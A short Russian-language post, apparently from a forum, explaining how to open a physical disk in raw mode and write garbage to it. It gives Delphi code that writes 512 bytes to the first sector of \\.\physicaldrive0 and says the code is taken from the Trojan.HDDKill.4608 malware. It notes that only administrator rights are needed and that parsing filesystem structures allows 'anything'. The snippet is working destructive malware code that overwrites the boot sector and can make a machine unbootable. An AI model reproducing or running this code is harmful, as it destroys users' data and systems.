Открывается диск в raw режиме и записывается любой мусор. Будет работать на NTFS. Единственное ограничение - права администратора. Если разобрать структуры фс, можно сделать вообще что угодно. Но на активной винде черевато подводными камнями.


var
f1: THANDLE;
bytesIO: DWORD;
buf: array[0..511] of BYTE;
textbuf: array[0..1023] of char;
begin
memcopy(@textbuf, @diskpart0, sizeof(diskpart0));
f1 := CreateFile(textbuf, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, 0, 0);
WriteFile(f1, buf, 512, bytesIO, nil);
CloseHandle(f1);
end;

где diskpart0 - \\.\physicaldrive0, пример - кусок из Trojan.HDDKill.4608
